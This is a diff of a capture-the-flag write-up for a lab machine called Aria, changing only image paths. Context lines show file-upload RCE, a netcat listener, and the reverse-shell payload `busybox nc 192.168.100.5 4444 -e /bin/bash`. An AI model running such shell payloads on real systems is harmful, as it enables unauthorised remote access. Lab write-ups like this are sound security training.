@@ -91,7 +91,7 @@ Connection closed.
 ```
 I moving on to the web server, but because the text is in chinese and I can't read it, I need this to be translated.
 
-![alt text](machines/Aria/image.png)
+![alt text](images/img.png)
 
 From that, I could see some of information like:
 - The file paths is generated using md5(time()-rand(1,1000))
@@ -153,8 +153,8 @@ Sun 28 Dec 2025 01:51:43 AM EST: New file created: /var/www/html/uploads/97e7258
 
 Access the file path and I got RCE:
 
-![alt text](image-2.png)
-![alt text](image-1.png)
+![alt text](images/img-2.png)
+![alt text](images/img-1.png)
 
 Setup a listener on kali machine:
 ```
@@ -164,7 +164,7 @@ listening on [any] 4444 ...
 ```
 
 now, trying to spawn a shell using payload `busybox nc 192.168.100.5 4444 -e /bin/bash`
-![alt text](image-3.png)
+![alt text](images/img-3.png)
 
 And just like that Got the shell!
 
@@ -186,13 +186,13 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 When I read the user.txt for the flag there is slightly a space, before the `www-data@Aria`:
-![alt text](image-4.png)
+![alt text](images/img-4.png)
 
 try to see if there any hidden character or something:
-![alt text](image-5.png)
+![alt text](images/img-5.png)
 Indeed, there are hidden message look like. Go to https://stegzero.com/, copy the contain of `user.txt` and check it:
 
-![alt text](image-6.png)
+![alt text](images/img-6.png)
 
 Got a token, idk for sure what's the use of this.
 
